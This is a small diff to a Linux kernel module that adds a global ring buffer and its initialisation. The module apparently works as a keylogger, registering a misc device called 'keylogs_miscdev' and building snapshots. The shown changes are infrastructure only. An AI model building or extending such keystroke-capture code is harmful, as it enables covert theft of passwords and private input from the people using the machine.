@@ -1,6 +1,10 @@
 // SPDX-License-Identifier: GPL-2.0
 
+#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
+
 #include "lk2.h"
+
+struct lk2_ring g_lk2_ring;
 
 static int lk2_build_snapshot(char **out_buf, size_t *out_len)
 {
@@ -83,6 +87,8 @@ static struct miscdevice keylogs_miscdev = {
 static int __init lk2_init(void)
 {
 	int err;
+
+	lk2_ring_init(&g_lk2_ring);
 
 	err = misc_register(&keylogs_miscdev);
 	if (err)
